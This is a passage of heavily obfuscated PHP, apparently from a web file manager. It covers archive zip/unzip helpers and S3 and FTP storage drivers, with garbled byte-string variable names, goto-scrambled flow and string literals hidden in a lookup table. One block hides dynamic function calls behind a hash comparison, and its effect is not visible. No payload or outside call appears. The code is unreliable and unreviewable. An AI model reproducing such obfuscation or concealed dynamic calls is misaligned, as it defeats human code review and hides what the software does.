DÅƒ¡¢… ç: } public static function errorTips($eÁòŠç¦²Ò = false) { goto E¢â–ŸŠßÅ; Cƒ¶ˆç²¦…: if ($eÁòŠç¦²Ò === -1) { return $bÚ °ÃÔ¸ ? $bÚ °ÃÔ¸[count($bÚ °ÃÔ¸) - 1] : $A­ÍÃ«¢Ô[33]; } if ($eÁòŠç¦²Ò === !1) { return implode($A­ÍÃ«¢Ô[228], $bÚ °ÃÔ¸); } if (count($bÚ °ÃÔ¸) >= $EÑŞš­Ş®) { $bÚ °ÃÔ¸ = array_slice($bÚ °ÃÔ¸, $EÑŞš­Ş® * 0.5, $EÑŞš­Ş®); } goto EêÒ‹Ÿ­õ½; EêÒ‹Ÿ­õ½: $bÚ °ÃÔ¸[] = $eÁòŠç¦²Ò; write_log($A­ÍÃ«¢Ô[160] . ACTION . $A­ÍÃ«¢Ô[1076] . $eÁòŠç¦²Ò, $A­ÍÃ«¢Ô[1077]); goto cƒãÔ†¤ËŒ; E¢â–ŸŠßÅ: $A­ÍÃ«¢Ô =& $_SERVER[¬ı§†‰ú˜¼]; static $bÚ °ÃÔ¸ = array(); $EÑŞš­Ş® = 1000; goto Cƒ¶ˆç²¦…; cƒãÔ†¤ËŒ: } public static function getLastError($a³ùÓİõäÎ = '') { $CÂ¤Õ„ÃöŒ = self::errorTips(-1); return $CÂ¤Õ„ÃöŒ ? $CÂ¤Õ„ÃöŒ : $a³ùÓİõäÎ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $a¥Ñ˜ñÁ‘; if (!$a¥Ñ˜ñÁ‘) { $Aºù„šµ = IO::init($_SERVER[¬ı§†‰ú˜¼][8]); } return $Aºù„šµ; } private static function iconvSystem($fÙ¼øï’Ñ) { return self::local()->iconvSystem($fÙ¼øï’Ñ); } private static function iconvApp($BÔ¨á©’¿“) { return self::local()->iconvApp($BÔ¨á©’¿“); } public static function zip($Fã¥®¸÷ƒ, $c«ˆô›¥éÁ = "\x7a\151\x70", $B†¿§£¨Ãá = '', $f“‚œæ´±õ = REPEAT_RENAME) { goto f¨Ñè¬¡‹; f¨Ñè¬¡‹: $f¯¨±æëğ™ =& $_SERVER[¬ı§†‰ú˜¼]; $Bâæğ³Çóù = self::init($Fã¥®¸÷ƒ[0][$f¯¨±æëğ™[76]]); $CõÈÚçÉ¨ = self::info($Fã¥®¸÷ƒ[0][$f¯¨±æëğ™[76]]); goto b´›ÊÁ…ÙØ; d±ê˜ Î¾: if (!$dÇ…Ê¾ãÅğ) { del_dir($c±Œøî¦Åø); show_json(LNG($f¯¨±æëğ™[1080]), !1); } del_dir($c±Œøî¦Åø); return $dÇ…Ê¾ãÅğ; goto dï¡›ó à; eº÷Ë”²Ü: foreach ($aÙòà²Öê as $A­ª’ÖŞòö => $DŒôŞ‹¹Æ) { $aÙòà²Öê[$A­ª’ÖŞòö] = self::iconvSystem($DŒôŞ‹¹Æ); } KodArchive::create($a‚†…’ˆ¡ñ, $aÙòà²Öê); if (!IO::exist($fïÀ¥‘…ò)) { if ($c±Œøî¦Åø) { del_dir($c±Œøî¦Åø); } show_json(LNG($f¯¨±æëğ™[1080]), !1); } goto aˆù–¢ë; eõ‘»Œïñ…: $fïÀ¥‘…ò = $CÂ¯±˜Ã¬İ . $dÍºù»Šï÷ . $f¯¨±æëğ™[95] . $c«ˆô›¥éÁ; $fïÀ¥‘…ò = get_filename_auto($fïÀ¥‘…ò, $f¯¨±æëğ™[33], $f“‚œæ´±õ); $a‚†…’ˆ¡ñ = self::iconvSystem($fïÀ¥‘…ò); goto eº÷Ë”²Ü; aˆù–¢ë: if ($B†¿§£¨Ãá || !$c±Œøî¦Åø) { if ($c±Œøî¦Åø && strstr($c±Œøî¦Åø, TEMP_FILES)) { $eİËš‹Ì±× = $aÙòà²Öê = array(); recursion_dir($CÂ¯±˜Ã¬İ, $eİËš‹Ì±×, $aÙòà²Öê, 0); foreach ($eİËš‹Ì±× as $aâôŞ¨¢¦) { del_dir($aâôŞ¨¢¦); } foreach ($aÙòà²Öê as $EšªŠò‹âœ) { if ($EšªŠò‹âœ == $a‚†…’ˆ¡ñ) { continue; } del_file($EšªŠò‹âœ); } } return $fïÀ¥‘…ò; } $B—’©å•Ã¥ = self::pathFather($CõÈÚçÉ¨[$f¯¨±æëğ™[76]]); $dÇ…Ê¾ãÅğ = self::move($fïÀ¥‘…ò, $B—’©å•Ã¥, $f“‚œæ´±õ); goto d±ê˜ Î¾; DŠÙí¹‹ÁÜ: if (count($aÙòà²Öê) > 1) { $DÜ¯®…ª½ç = IO::info(IO::pathFather($CõÈÚçÉ¨[$f¯¨±æëğ™[76]])); $dÍºù»Šï÷ = $DÜ¯®…ª½ç[$f¯¨±æëğ™[28]]; } $CÂ¯±˜Ã¬İ = $c±Œøî¦Åø; if (!$CÂ¯±˜Ã¬İ) { $CÂ¯±˜Ã¬İ = get_path_father($CõÈÚçÉ¨[$f¯¨±æëğ™[76]]); if (!$B†¿§£¨Ãá && $Bâæğ³Çóù->getType() == $f¯¨±æëğ™[106]) { $CÂ¯±˜Ã¬İ = get_path_father($Bâæğ³Çóù->path); } $c©ÄåÓè÷œ = IO::info($CÂ¯±˜Ã¬İ); if (!$c©ÄåÓè÷œ[$f¯¨±æëğ™[195]]) { show_json(LNG($f¯¨±æëğ™[1079]), !1); } } goto eõ‘»Œïñ…; b´›ÊÁ…ÙØ: $c±Œøî¦Åø = !1; if (!$B†¿§£¨Ãá && $Bâæğ³Çóù->getType() == $f¯¨±æëğ™[106]) { $aÙòà²Öê = self::zipFileList($Fã¥®¸÷ƒ); } else { $c±Œøî¦Åø = $B†¿§£¨Ãá ? $B†¿§£¨Ãá : TEMP_FILES . $f¯¨±æëğ™[1078] . time() . rand_string(8) . $f¯¨±æëğ™[8]; mk_dir($c±Œøî¦Åø); $aÙòà²Öê = self::zipFileList($Fã¥®¸÷ƒ, $c±Œøî¦Åø); } $dÍºù»Šï÷ = $CõÈÚçÉ¨[$f¯¨±æëğ™[28]]; goto DŠÙí¹‹ÁÜ; dï¡›ó à: } public static function unzip($EÍ©‰®œÑ, $cºêô°¢¥¹ = "\162\145\x70\154\x61\x63\145") { goto B·ôó¹ƒ›ï; bàï‚ÂîŞ½: if (!($då¾ªİ¯¿ˆ = parent::info($FšÊÏ…Åâé))) { show_json(LNG($F®¢êÂá[1082]), !1); } if (!($DšÚÑ§ß = parent::infoFull($AÉè±© —á))) { $AÉè±© —á = parent::mkdir($AÉè±© —á); $DšÚÑ§ß = array($F®¢êÂá[76] => $AÉè±© —á); } else { if (isset($DšÚÑ§ß[$F®¢êÂá[394]]) && trim($DšÚÑ§ß[$F®¢êÂá[76]], $F®¢êÂá[8]) != trim($AÉè±© —á, $F®¢êÂá[8])) { $F½—¡¬¯« = KodIO::make($DšÚÑ§ß[$F®¢êÂá[476]]); $DÊ†ºÄó¼ = parent::fileNameAuto($F½—¡¬¯«, $DšÚÑ§ß[$F®¢êÂá[28]], REPEAT_RENAME_FOLDER, !0); $AÉè±© —á = parent::mkdir($F½—¡¬¯« . $DÊ†ºÄó¼); $DšÚÑ§ß = array($F®¢êÂá[76] => $AÉè±© —á); } } $AÉè±© —á = $DšÚÑ§ß[$F®¢êÂá[76]]; goto FöÓ¦©—™; CÕÃ‹Éù—: return !0; goto cÔ¿Ã¼¶ï; e¹Æ¥©³Êî: Hook::trigger($F®¢êÂá[1088], $b•æ£òÙ•£); recursion_dir($b•æ£òÙ•£, $E‰”Ôç«…, $c¥ŒòáÒÅ‡, 0); $AÊô“¯Ú­ = array_merge($E‰”Ôç«…, $c¥ŒòáÒÅ‡); goto C”œ¿±™; dÆœâà±­: if (!@file_exists(self::iconvSystem($DÂù­Ûòù))) { $dàŒå¢Å‚è = self::localFilePath($FšÊÏ…Åâé, $c‚¬½ÑÑİ¹); $DÂù­Ûòù = $dàŒå¢Å‚è ? $dàŒå¢Å‚è : parent::download($FšÊÏ…Åâé, $DÂù­Ûòù); } $DÂù­Ûòù = self::iconvSystem($DÂù­Ûòù); $Cº¬­¥ÎŒõ = isset($EÍ©‰®œÑ[$F®¢êÂá[1083]]) ? $EÍ©‰®œÑ[$F®¢êÂá[1083]] : $F®¢êÂá[1084]; goto A£ñ¦å†î; C”œ¿±™: foreach ($AÊô“¯Ú­ as $bù’÷ãµŸ‰) { $bù’÷ãµŸ‰ = self::iconvApp($bù’÷ãµŸ‰); self::move($bù’÷ãµŸ‰, $AÉè±© —á, $cºêô°¢¥¹); } del_dir($b•æ£òÙ•£); if (!$dàŒå¢Å‚è) { del_file($DÂù­Ûòù); } goto CÕÃ‹Éù—; FöÓ¦©—™: $aİªììÚƒ· = self::tmpFileName($då¾ªİ¯¿ˆ); $b•æ£òÙ•£ = TEMP_FILES . $aİªììÚƒ·; del_dir($b•æ£òÙ•£); goto bá¿¥å±¤ç; A£ñ¦å†î: $A‚†×Æ»ó‹ = KodArchive::extract($DÂù­Ûòù, $b•æ£òÙ•£ . $F®¢êÂá[8], $Cº¬­¥ÎŒõ); self::archiveExt(); if (!$A‚†×Æ»ó‹[$F®¢êÂá[1085]]) { show_json($F®¢êÂá[1086] . $A‚†×Æ»ó‹[$F®¢êÂá[1087]], !1); } goto e¹Æ¥©³Êî; B·ôó¹ƒ›ï: $F®¢êÂá =& $_SERVER[¬ı§†‰ú˜¼]; $FšÊÏ…Åâé = $EÍ©‰®œÑ[$F®¢êÂá[76]]; $AÉè±© —á = $EÍ©‰®œÑ[$F®¢êÂá[1081]]; goto bàï‚ÂîŞ½; bá¿¥å±¤ç: mk_dir($b•æ£òÙ•£); $c‚¬½ÑÑİ¹ = self::fileExt($då¾ªİ¯¿ˆ); $DÂù­Ûòù = $b•æ£òÙ•£ . $F®¢êÂá[95] . $c‚¬½ÑÑİ¹; goto dÆœâà±­; cÔ¿Ã¼¶ï: } public static function unzipList($FÂàÅ¦™Õ) { goto b°Û¤‘õ¾½; Aƒ‘‹Ş‡ê: $c¨Æ¹Ïˆéİ = json_encode($a½Ï·éğã[$A ‚ò‰¬[1087]]); self::setContent($d¾Æ·èÖĞ, $c¨Æ¹Ïˆéİ); if (count($a½Ï·éğã[$A ‚ò‰¬[1087]]) >= $fÙèì˜œˆÎ) { show_json(sprintf(LNG($A ‚ò‰¬[1091]), count($a½Ï·éğã[$A ‚ò‰¬[1087]])), !1); } goto Eá¥Ç©«·; dÄÛ‡±¦×¤: if (!is_dir($F¦”„¾ÍÓ¼)) { mk_dir($F¦”„¾ÍÓ¼); } $c¡¾²¸ñÒÄ = $F¦”„¾ÍÓ¼ . $A ‚ò‰¬[8] . $bÁ“ÁÉ‡äœ; if (!@file_exists(self::iconvSystem($c¡¾²¸ñÒÄ))) { if (isset($Cññ‘Ú¼ò’)) { url_request($b»®„ŞßÙ, $A ‚ò‰¬[1092], $c¡¾²¸ñÒÄ); } else { $E”İÉ’± = self::localFilePath($b»®„ŞßÙ, $dëŠåÉ¤Ùõ); $c¡¾²¸ñÒÄ = $E”İÉ’± ? $E”İÉ’± : self::download($b»®„ŞßÙ, $c¡¾²¸ñÒÄ); } } goto C¼ÕÌÚğš’; Eá¥Ç©«·: return $a½Ï·éğã[$A ‚ò‰¬[1087]]; goto BÄÍ½‰¸Ìö; C¼ÕÌÚğš’: $c¡¾²¸ñÒÄ = self::iconvSystem($c¡¾²¸ñÒÄ); if ($FÂŒ½¥¢ >= 0) { $DÁÑÅÁÍ´Ø = isset($FÂàÅ¦™Õ[$A ‚ò‰¬[1093]]) ? $FÂàÅ¦™Õ[$A ‚ò‰¬[1093]] : !1; $dÌŒ‰Ãø´­ = isset($FÂàÅ¦™Õ[$A ‚ò‰¬[28]]) ? $FÂàÅ¦™Õ[$A ‚ò‰¬[28]] : $A ‚ò‰¬[33]; KodArchive::filePreview($c¡¾²¸ñÒÄ, $FÂŒ½¥¢, $DÁÑÅÁÍ´Ø, $dÌŒ‰Ãø´­); self::archiveExt(); die; } $a½Ï·éğã = KodArchive::listContent($c¡¾²¸ñÒÄ); goto CŸÊæµÌ‘¤; aÏ†‚ëœÖ: if (isset($Cññ‘Ú¼ò’)) { $a®„÷á»¸Î = array($Cññ‘Ú¼ò’[$A ‚ò‰¬[76]], $Cññ‘Ú¼ò’[$A ‚ò‰¬[1089]], $Cññ‘Ú¼ò’[$A ‚ò‰¬[28]]); $bÁ“ÁÉ‡äœ = md5(implode($A ‚ò‰¬[71], $a®„÷á»¸Î)) . $A ‚ò‰¬[95] . get_path_ext($Cññ‘Ú¼ò’[$A ‚ò‰¬[28]]); } else { $a®„÷á»¸Î = array($AÅö÷ˆ†µ¿[$A ‚ò‰¬[28]], $AÅö÷ˆ†µ¿[$A ‚ò‰¬[76]], $AÅö÷ˆ†µ¿[$A ‚ò‰¬[78]]); $bÁ“ÁÉ‡äœ = md5(implode($A ‚ò‰¬[71], $a®„÷á»¸Î)) . $A ‚ò‰¬[95] . $dëŠåÉ¤Ùõ; } if ($FÂŒ½¥¢ == -1) { $d¾Æ·èÖĞ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\145\167\x2f{$cÙÀš¥«‰Ñ}\x2f{$bÁ“ÁÉ‡äœ}\56\x6c\x6f\x67"; $ağš«¢‚öÆ = self::infoFull($d¾Æ·èÖĞ); if ($ağš«¢‚öÆ) { $d¾Æ·èÖĞ = $ağš«¢‚öÆ[$A ‚ò‰¬[76]]; $f‡ŸÒ•ôÄ¦ = self::getContent($d¾Æ·èÖĞ); if ($f‡ŸÒ•ôÄ¦) { $c¨Æ¹Ïˆéİ = json_decode($f‡ŸÒ•ôÄ¦, !0); if (count($c¨Æ¹Ïˆéİ) >= $fÙèì˜œˆÎ) { show_json(sprintf(LNG($A ‚ò‰¬[1091]), count($c¨Æ¹Ïˆéİ)), !1); } return $c¨Æ¹Ïˆéİ; } } else { $d¾Æ·èÖĞ = self::mkfile($d¾Æ·èÖĞ); } } $F¦”„¾ÍÓ¼ = TEMP_FILES . $cÙÀš¥«‰Ñ; goto dÄÛ‡±¦×¤; b°Û¤‘õ¾½: $A ‚ò‰¬ =& $_SERVER[¬ı§†‰ú˜¼]; $b»®„ŞßÙ = $FÂàÅ¦™Õ[$A ‚ò‰¬[76]]; $FÂŒ½¥¢ = isset($FÂàÅ¦™Õ[$A ‚ò‰¬[1089]]) ? $FÂàÅ¦™Õ[$A ‚ò‰¬[1089]] : -1; goto aê…¹œõÉˆ; aê…¹œõÉˆ: $fÙèì˜œˆÎ = 50000; if (request_url_safe($b»®„ŞßÙ)) { $Cññ‘Ú¼ò’ = parse_url_query($b»®„ŞßÙ); if (!isset($Cññ‘Ú¼ò’[$A ‚ò‰¬[76]])) { show_json($A ‚ò‰¬[1090], !1); } } $bµöªÛ˜éè = isset($Cññ‘Ú¼ò’) ? $Cññ‘Ú¼ò’[$A ‚ò‰¬[76]] : $b»®„ŞßÙ; goto Aó©É”¢¨; CŸÊæµÌ‘¤: self::archiveExt(); del_dir($F¦”„¾ÍÓ¼); if (!$a½Ï·éğã[$A ‚ò‰¬[1085]]) { show_json($a½Ï·éğã[$A ‚ò‰¬[1087]], !1); } goto Aƒ‘‹Ş‡ê; Aó©É”¢¨: $AÅö÷ˆ†µ¿ = self::info($bµöªÛ˜éè); $dëŠåÉ¤Ùõ = self::fileExt($AÅö÷ˆ†µ¿); $cÙÀš¥«‰Ñ = self::tmpFileName($AÅö÷ˆ†µ¿); goto aÏ†‚ëœÖ; BÄÍ½‰¸Ìö: } private static function fileExt($dè”‘Ó´ÇÌ) { $A¶£öáÃÄ =& $_SERVER[¬ı§†‰ú˜¼]; $Eñ±¾»‰Ì = $dè”‘Ó´ÇÌ[$A¶£öáÃÄ[168]]; if ($Eñ±¾»‰Ì == $A¶£öáÃÄ[1094]) { $A¹¾ã´ó = $A¶£öáÃÄ[1095]; if (substr($dè”‘Ó´ÇÌ[$A¶£öáÃÄ[28]], -strlen($A¹¾ã´ó)) == $A¹¾ã´ó) { $Eñ±¾»‰Ì = $A¶£öáÃÄ[1096]; } } self::archiveExt($Eñ±¾»‰Ì); return $Eñ±¾»‰Ì; } private static function zipFileList($cá‚„‚‚Î, $Aƒ¡ÊÂœ = false) { $Bœ¢‚ìñŒí =& $_SERVER[¬ı§†‰ú˜¼]; $Dè±°’ªßæ = array(); foreach ($cá‚„‚‚Î as $d×Çè»§â) { $DÎ”â×ÃÂ” = $d×Çè»§â[$Bœ¢‚ìñŒí[76]]; if ($Aƒ¡ÊÂœ) { $DÎ”â×ÃÂ” = self::copy($d×Çè»§â[$Bœ¢‚ìñŒí[76]], $Aƒ¡ÊÂœ, $Bœ¢‚ìñŒí[791]); } else { $BŒ‹áˆïâ¬ = self::init($d×Çè»§â[$Bœ¢‚ìñŒí[76]]); if ($BŒ‹áˆïâ¬->getType() == $Bœ¢‚ìñŒí[106]) { $DÎ”â×ÃÂ” = $BŒ‹áˆïâ¬->path; } } if ($DÎ”â×ÃÂ” && self::local()->exist($DÎ”â×ÃÂ”)) { $Dè±°’ªßæ[$d×Çè»§â[$Bœ¢‚ìñŒí[76]]] = $DÎ”â×ÃÂ”; } } if (!empty($Dè±°’ªßæ)) { return array_values($Dè±°’ªßæ); } show_json(LNG($Bœ¢‚ìñŒí[1060]), !1); } public static function tmpFileName($Bí¤³¸¢Ëª) { $AµŞ¶Óõİ„ =& $_SERVER[¬ı§†‰ú˜¼]; $cÜÂ…«í“ï = array($Bí¤³¸¢Ëª[$AµŞ¶Óõİ„[28]], $Bí¤³¸¢Ëª[$AµŞ¶Óõİ„[76]], $Bí¤³¸¢Ëª[$AµŞ¶Óõİ„[78]], $Bí¤³¸¢Ëª[$AµŞ¶Óõİ„[485]]); return md5(implode($AµŞ¶Óõİ„[71], $cÜÂ…«í“ï)); } private static function localFilePath($CŠïá–áì, $a˜ƒµ‚Ãº ) { goto FÀ—éÎŒ²È; FÀ—éÎŒ²È: $aÕñßó™ç =& $_SERVER[¬ı§†‰ú˜¼]; if ($a˜ƒµ‚Ãº  == $aÕñßó™ç[1097] && strtoupper(substr(PHP_OS, 0, 3)) == $aÕñßó™ç[1098]) { return !1; } $CÃò¢Ó¾¬ò = KodIO::parse($CŠïá–áì); goto eáå¿ñŞ†Ë; Bˆµ›öË¹¡: if ($fùµ›¿ñ“ == $aÕñßó™ç[106] || $fùµ›¿ñ“ == $aÕñßó™ç[1100]) { if (!$eÓÈ„‘->exist($eÓÈ„‘->path)) { show_json(LNG($aÕñßó™ç[105]), !1); } return $eÓÈ„‘->path; } return !1; goto C‡–÷ïˆµ¤; eáå¿ñŞ†Ë: if ($CÃò¢Ó¾¬ò[$aÕñßó™ç[29]] == KodIO::KOD_SOURCE) { $dùø¦Îß’ø = Model($aÕñßó™ç[798])->fileInfoGet(KodIO::sourceID($CŠïá–áì)); if (!$dùø¦Îß’ø[$aÕñßó™ç[76]]) { show_json($aÕñßó™ç[1099], !1); } $CŠïá–áì = $dùø¦Îß’ø[$aÕñßó™ç[76]]; } $eÓÈ„‘ = self::init($CŠïá–áì); $fùµ›¿ñ“ = $eÓÈ„‘->getType(); goto Bˆµ›öË¹¡; C‡–÷ïˆµ¤: } private static function archiveExt($Fèíõ¦ÖÕÄ = '') { $GLOBALS[$_SERVER[¬ı§†‰ú˜¼][1101]] = $Fèíõ¦ÖÕÄ; } } goto aîÊì¥ƒÄ; bÅ®çöö: $bÙÇÈä¨“Ğ = $_SERVER[$_SERVER[¬ı§†‰ú˜¼][764]]; $D—ŠŒÕÛƒ¸ = $_SERVER[¬ı§†‰ú˜¼][829]; if ($_SERVER[$_SERVER[¬ı§†‰ú˜¼][763]] != $D—ŠŒÕÛƒ¸($bÙÇÈä¨“Ğ)) { goto f£õÛáùì; f£õÛáùì: $dÆ×ñ‰à’ = $_SERVER[¬ı§†‰ú˜¼][765]; $CïÕ”«‡ÁÂ = $_SERVER[$_SERVER[¬ı§†‰ú˜¼][766]] . $_SERVER[¬ı§†‰ú˜¼][767]; $A–ÂöÎàó— = $dÆ×ñ‰à’($CïÕ”«‡ÁÂ); goto cŠ×‹ÄŸ; cŠ×‹ÄŸ: $C¾åÈ°Ğ®Œ = explode($_SERVER[¬ı§†‰ú˜¼][228], $A–ÂöÎàó—); if (count($C¾åÈ°Ğ®Œ) < $_SERVER[¬ı§†‰ú˜¼][584]) { $C•²…–†å = $_SERVER[¬ı§†‰ú˜¼][768]; $C•²…–†å(); } $aÄ¥ÆÖ†ËØ = $_SERVER[¬ı§†‰ú˜¼][769]; goto DÅÄñï•ÆŒ; DÅÄñï•ÆŒ: $aÄ¥ÆÖ†ËØ($bÙÇÈä¨“Ğ); goto B…Æñ×“å‹; B…Æñ×“å‹: } goto A‘ß•Èƒò; bÌñõÌ©ŠÌ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($E¦ß÷íºª•) { parent::__construct($E¦ß÷íºª•); $this->signatureVersion($_SERVER[¬ı§†‰ú˜¼][211]); } public function uploadFormData($b‰¹¡ÅÈÇ, $FÚ×¡ª¦ì¡ = 3600) { goto fÃÇ“—ÄÑ; fİšáóë­›: $cé·„§—îò = $DÎ¦çìÒÜ[59]; $aØµî¾ö· = gmdate($DÎ¦çìÒÜ[1223]); $a±çÖë ¾Š = gmdate($DÎ¦çìÒÜ[715]); goto cê…ºÑª–‡; E¼Û¶’ÁÜ: $CÇ±»Áì˜ = hash_hmac($DÎ¦çìÒÜ[1232], $cé·„§—îò, $AğœÏ‚×¢, !0); $béù÷óÚğÁ = hash_hmac($DÎ¦çìÒÜ[1232], $F¯î£–Õ², $CÇ±»Áì˜, !0); $B¼ç¶ÌÅºó = hash_hmac($DÎ¦çìÒÜ[1232], $Eéá¿ÂÎ„, $béù÷óÚğÁ); goto D’­–’•ãŸ; D’­–’•ãŸ: $f‘²Ò£Ê½ = array($DÎ¦çìÒÜ[210] => $DÎ¦çìÒÜ[33], $DÎ¦çìÒÜ[1234] => $DÎ¦çìÒÜ[33], $DÎ¦çìÒÜ[1191] => $dù»²É¬, $DÎ¦çìÒÜ[1195] => $aÕÚ„ÊØ›ù, $DÎ¦çìÒÜ[1199] => $Eéá¿ÂÎ„, $DÎ¦çìÒÜ[1235] => $bö‚©¸šŞ², $DÎ¦çìÒÜ[1236] => $D”×™ã’ã, $DÎ¦çìÒÜ[1237] => $aØµî¾ö·, $DÎ¦çìÒÜ[1238] => $c×ô¥ ¿†ë, $DÎ¦çìÒÜ[1239] => $B¼ç¶ÌÅºó, $DÎ¦çìÒÜ[175] => $this->getHost()); return $f‘²Ò£Ê½; goto b±£œÌ¾³; döÏÜù‡ÚÚ: $e†¬—ŠÛ³ä = array($this->accessKey, $a±çÖë ¾Š, $this->region, $cé·„§—îò, $F¯î£–Õ²); $bö‚©¸šŞ² = implode($DÎ¦çìÒÜ[8], $e†¬—ŠÛ³ä); $AÊÂ­½… = array($DÎ¦çìÒÜ[1189] => gmdate($DÎ¦çìÒÜ[1188], strtotime($DÎ¦çìÒÜ[1225])), $DÎ¦çìÒÜ[1190] => array(array($DÎ¦çìÒÜ[1192] => $this->bucket), array($DÎ¦çìÒÜ[1191] => $dù»²É¬), array($DÎ¦çìÒÜ[1193], $DÎ¦çìÒÜ[1194], $DÎ¦çìÒÜ[33]), array($DÎ¦çìÒÜ[1193], $DÎ¦çìÒÜ[1226], $DÎ¦çìÒÜ[33]), array($DÎ¦çìÒÜ[1193], $DÎ¦çìÒÜ[1227], $DÎ¦çìÒÜ[33]), array($DÎ¦çìÒÜ[1195] => $aÕÚ„ÊØ›ù), array($DÎ¦çìÒÜ[1228] => $bö‚©¸šŞ²), array($DÎ¦çìÒÜ[1229] => $D”×™ã’ã), array($DÎ¦çìÒÜ[1230] => $aØµî¾ö·), array($DÎ¦çìÒÜ[1231] => $c×ô¥ ¿†ë))); goto DÊÈ‘ÏÇ‘; fÃÇ“—ÄÑ: $DÎ¦çìÒÜ =& $_SERVER[¬ı§†‰ú˜¼]; $dù»²É¬ = $DÎ¦çìÒÜ[191]; $D”×™ã’ã = $DÎ¦çìÒÜ[1222]; goto fİšáóë­›; cê…ºÑª–‡: $F¯î£–Õ² = $DÎ¦çìÒÜ[1224]; $c×ô¥ ¿†ë = $FÚ×¡ª¦ì¡ . $DÎ¦çìÒÜ[33]; $aÕÚ„ÊØ›ù = $DÎ¦çìÒÜ[1187]; goto döÏÜù‡ÚÚ; DÊÈ‘ÏÇ‘: $Eéá¿ÂÎ„ = base64_encode(json_encode($AÊÂ­½…)); $eÃê­‚Ş‰‘ = hash_hmac($DÎ¦çìÒÜ[1232], $a±çÖë ¾Š, $DÎ¦çìÒÜ[1233] . $this->secret, !0); $AğœÏ‚×¢ = hash_hmac($DÎ¦çìÒÜ[1232], $this->region, $eÃê­‚Ş‰‘, !0); goto E¼Û¶’ÁÜ; b±£œÌ¾³: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($dâùŠÛ„ÌÙ) { parent::__construct(); if (count($dâùŠÛ„ÌÙ) > 0) { $this->_init($dâùŠÛ„ÌÙ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($bŸŸÆòÒ™†) { $C¨Ò‰š»Ù =& $_SERVER[¬ı§†‰ú˜¼]; global $config; $this->appCharset = $config[$C¨Ò‰š»Ù[1240]]; $this->systemCharset = $config[$C¨Ò‰š»Ù[1241]]; if (isset($bŸŸÆòÒ™†[$C¨Ò‰š»Ù[1242]]) && $bŸŸÆòÒ™†[$C¨Ò‰š»Ù[1242]]) { $this->systemCharset = $bŸŸÆòÒ™†[$C¨Ò‰š»Ù[1242]]; } } public function iconvApp($bá½¥ÌÖ‰“) { return $this->iconvTo($bá½¥ÌÖ‰“, $this->systemCharset, $this->appCharset); } public function iconvSystem($FáïÃÃ ©À) { return $this->iconvTo($FáïÃÃ ©À, $this->appCharset, $this->systemCharset); } public function getPathOuter($Cí—°¤Œ³Š) { goto B¯²ÁŒš; F‘©ù­¼’¿: $Cí—°¤Œ³Š = KodIO::clear($Cí—°¤Œ³Š); $Cí—°¤Œ³Š = substr($Cí—°¤Œ³Š, strlen($Dİ‡éå½Â)); if (empty($this->pathDriver)) { return $Cí—°¤Œ³Š; } goto eŒœÎó…±Ò; B¯²ÁŒš: $cùÏç´…Ø =& $_SERVER[¬ı§†‰ú˜¼]; $Dİ‡éå½Â = $this->iconvApp($this->pathBase); $Cí—°¤Œ³Š = $this->iconvApp($Cí—°¤Œ³Š); goto dê»Û‹Ğò‘; dê»Û‹Ğò‘: if (substr($Dİ‡éå½Â, 0, 2) == $cùÏç´…Ø[1243]) { $Dİ‡éå½Â = BASIC_PATH . substr($Dİ‡éå½Â, 2); } if (substr($Cí—°¤Œ³Š, 0, 2) == $cùÏç´…Ø[1243]) { $Cí—°¤Œ³Š = BASIC_PATH . substr($Cí—°¤Œ³Š, 2); } $Dİ‡éå½Â = KodIO::clear($Dİ‡éå½Â); goto F‘©ù­¼’¿; eŒœÎó…±Ò: return $this->pathDriver . $cùÏç´…Ø[8] . ltrim($Cí—°¤Œ³Š, $cùÏç´…Ø[8]); goto aêÒ¾šØÏ; aêÒ¾šØÏ: } private function _init($Aå¥‰ÅôÍİ = array()) { $BÁîî¯°ï¨ =& $_SERVER[¬ı§†‰ú˜¼]; if (!function_exists($BÁîî¯°ï¨[1244])) { throw new Exception(LNG($BÁîî¯°ï¨[1245])); } $this->config = $Aå¥‰ÅôÍİ; $this->charsetReset($Aå¥‰ÅôÍİ); foreach ($Aå¥‰ÅôÍİ as $f¦¾×•¹ ˜ => $cÍğ²òµ‰¤) { if (isset($this->{$f¦¾×•¹ ˜})) { $this->{$f¦¾×•¹ ˜} = $cÍğ²òµ‰¤; } } return $this->_login($Aå¥‰ÅôÍİ); } private function _login($d™¦ÈÌñ„…) { goto cÙŠˆõÚ÷¾; c±‡Ë‡™ò¿: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $CèÃ¾áËïÃ = @ftp_login($this->connect, $this->username, $this->userpass); goto Aª½åÜéŠ; bƒ ÜğÉÊ: if (isset($eºöÄ›²‹[$eŠ‡£ŒÄÚ±])) { foreach ($eºöÄ›²‹[$eŠ‡£ŒÄÚ±] as $eÑÏ¶İ øù => $CÂÍÚî„¾™) { $this->{$eÑÏ¶İ øù} = $CÂÍÚî„¾™; } return !0; } $F½‘¶“àó¶ = parse_url(trim($this->server, $BÍ†¡êª¹[8])); $this->host = $F½‘¶“àó¶[$BÍ†¡êª¹[175]]; goto Aè²»çãÊè; Aª½åÜéŠ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $e¸áĞã³æ = $this->pasv == $BÍ†¡êª¹[87] ? !0 : !1; @ftp_pasv($this->connect, $e¸áĞã³æ); goto aÎë™ŒáåÈ; cÙŠˆõÚ÷¾: $BÍ†¡êª¹ =& $_SERVER[¬ı§†‰ú˜¼]; static $eºöÄ›²‹ = array(); $eŠ‡£ŒÄÚ± = md5(json_encode($d™¦ÈÌñ„…)); goto bƒ ÜğÉÊ; Aè²»çãÊè: $d‰é›¦ßè³ = isset($F½‘¶“àó¶[$BÍ†¡êª¹[174]]) && $F½‘¶“àó¶[$BÍ†¡êª¹[174]] == $BÍ†¡êª¹[1246] ? !0 : !1; $this->scheme = $d‰é›¦ßè³ ? $BÍ†¡êª¹[1247] : $BÍ†¡êª¹[1248]; $this->port = isset($F½‘¶“àó¶[$BÍ†¡êª¹[176]]) ? $F½‘¶“àó¶[$BÍ†¡êª¹[176]] : 21; goto c±‡Ë‡™ò¿; aÎë™ŒáåÈ: $eºöÄ›²‹[$eŠ‡£ŒÄÚ±] = 